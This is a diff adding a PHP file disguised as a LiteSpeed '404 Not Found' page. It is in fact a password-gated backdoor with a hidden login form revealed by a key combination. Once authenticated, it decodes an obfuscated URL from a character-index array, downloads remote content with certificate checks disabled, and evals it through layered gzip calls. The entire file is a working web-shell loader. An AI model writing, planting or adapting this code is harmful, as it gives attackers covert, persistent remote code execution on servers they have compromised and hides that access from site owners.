@@ -1,0 +1,97 @@
+<?php
+session_start();
+
+// Ganti dengan hash bcrypt password Anda
+ $stored_hash = '$2y$10$mHr5AvS0Vjh0YT7qoy9hEet2qA48uUbZRpj6W.VSWT58zvpX6xuH2'; // Hash bcrypt untuk password
+
+// Cek apakah password sudah dikirim
+if (isset($_POST['pwd'])) {
+    if (password_verify($_POST['pwd'], $stored_hash)) {
+        $_SESSION['authenticated'] = true;
+    }
+}
+
+// Jika sudah terautentikasi, jalankan shell
+if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']) {
+    $characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
+    $indexArray = [7,19,19,15,18,63,64,64,1,8,13,62,12,20,3,5,8,18,7,62,13,4,19,64,17,64,54,58,61,66,55,52,56,58,66,60,54,53,55];
+    $decodedString = '';
+    foreach ($indexArray as $index) {
+        $decodedString .= $characters[$index];
+    }
+    $url = "$decodedString";
+    function fetchContent($url) { 
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        $content = curl_exec($ch);
+        curl_close($ch);
+        return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($content))))))));
+    }
+    @eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url))))))))));
+} else {
+    // Tampilkan halaman 404 dengan form tersembunyi
+    header("HTTP/1.0 404 Not Found");
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>404 Not Found</title>
+        <style>
+            body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+            .error-code { font-size: 72px; color: #333; }
+            .message { font-size: 24px; color: #666; }
+            #loginForm { display: none; margin-top: 30px; }
+            #pwd { padding: 10px; width: 200px; }
+            #submit { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
+        </style>
+    </head>
+    <body>
+        <div class="error-code">404</div>
+        <div class="message">Page not found</div>
+<div style="font-size:18px; color:#777; margin-top:15px;">
+        The resource requested could not be found on this server!
+    </div>
+<div style="
+    position: fixed;
+    left: 0;
+    bottom: 0;
+    width: 100%;
+    background: #1a1a1a;
+    color: #ccc;
+    padding: 20px 10px;
+    font-size: 14px;
+    text-align: center;
+    line-height: 1.6;
+">
+    Proudly powered by LiteSpeed Web Server<br>
+    Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, 
+    has no control over content found on this site.
+</div>        
+        <!-- Form login tersembunyi -->
+        <form method="post" id="loginForm">
+            <input type="password" name="pwd" id="pwd" placeholder="Password" required>
+            <input type="submit" id="submit" value="Login">
+        </form>
+
+        <script>
+            // Deteksi kombinasi tombol rahasia (Ctrl+Shift+X)
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.shiftKey && e.key === 'B') {
+                    document.getElementById('loginForm').style.display = 'block';
+                    document.getElementById('pwd').focus();
+                }
+            });
+
+            // Sembunyikan form saat submit
+            document.getElementById('loginForm').addEventListener('submit', function() {
+                this.style.display = 'none';
+            });
+        </script>
+    </body>
+    </html>
+    <?php
+}
+?>
